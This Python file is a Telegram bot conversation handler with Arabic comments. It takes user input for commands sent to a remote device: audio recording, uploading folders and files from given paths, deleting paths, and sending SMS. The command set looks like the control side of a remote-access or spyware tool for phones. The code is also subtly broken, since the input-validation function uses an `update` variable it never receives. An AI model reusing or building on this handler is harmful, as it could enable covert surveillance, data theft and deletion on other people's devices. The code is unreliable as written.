"""
معالج المحادثات (للبيانات الإضافية)
"""
from typing import Dict, Any
from telegram import Update
from telegram.ext import ContextTypes

from handlers.base_handler import BaseHandler
from handlers.command_handler import CommandHandler
from models.enums import CommandType
from utils.validators import Validators
from utils.logger import get_logger

logger = get_logger(__name__)


class ConversationHandler(BaseHandler):
    """معالج المحادثات - لإدارة العمليات متعددة الخطوات."""

    def __init__(self, command_handler: CommandHandler):
        super().__init__(command_handler.device_service, command_handler.command_service)
        self.command_handler = command_handler

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """معالجة الرسائل النصية (للبيانات الإضافية)."""
        if not await self._check_auth(update):
            return

        text = update.message.text.strip()
        pending = context.user_data.get('pending_command')

        if not pending:
            await update.message.reply_text(
                "⚠️ لا توجد عملية معلقة.\n"
                "استخدم الأزرار لإرسال الأوامر."
            )
            return

        device_id = pending['device_id']
        command_type = CommandType(pending['command_type'])

        # معالجة البيانات حسب نوع الأمر
        params = await self._process_input(text, command_type)

        if params is None:
            # خطأ في الإدخال
            return

        # إزالة الحالة المعلقة
        context.user_data.pop('pending_command', None)

        # تنفيذ الأمر مع المعاملات
        await self.command_handler._execute_command_direct(
            update,
            self.device_service.get_device(device_id),
            command_type,
            params,
        )

    async def _process_input(self, text: str, command_type: CommandType) -> Dict[str, Any]:
        """معالجة المدخلات حسب نوع الأمر."""
        if command_type == CommandType.RECORD_AUDIO:
            seconds = Validators.validate_seconds(text)
            if seconds is None:
                await update.message.reply_text(
                    "❌ **خطأ في الإدخال**\n"
                    "الرجاء إدخال عدد صحيح بين 1 و 60."
                )
                return None
            return {"seconds": seconds}

        elif command_type == CommandType.SEND_FOLDER:
            if not Validators.validate_path(text):
                await update.message.reply_text(
                    "❌ **خطأ في المسار**\n"
                    "الرجاء إدخال مسار صحيح يبدأ بـ `/`."
                )
                return None
            return {"path": text}

        elif command_type == CommandType.SEND_FILE:
            if not Validators.validate_path(text):
                await update.message.reply_text(
                    "❌ **خطأ في المسار**\n"
                    "الرجاء إدخال مسار صحيح يبدأ بـ `/`."
                )
                return None
            return {"path": text}

        elif command_type == CommandType.DELETE:
            if not Validators.validate_path(text):
                await update.message.reply_text(
                    "❌ **خطأ في المسار**\n"
                    "الرجاء إدخال مسار صحيح يبدأ بـ `/`."
                )
                return None
            return {"path": text}

        elif command_type == CommandType.SEND_SMS:
            phone, message = Validators.validate_sms_input(text)
            if phone is None:
                await update.message.reply_text(
                    "❌ **خطأ في الإدخال**\n"
                    "الرجاء إدخال الرقم والنص مفصولين بفاصلة.\n"
                    "مثال: `0561234567,نص الرسالة`"
                )
                return None
            return {"phone": phone, "message": message}

        return {}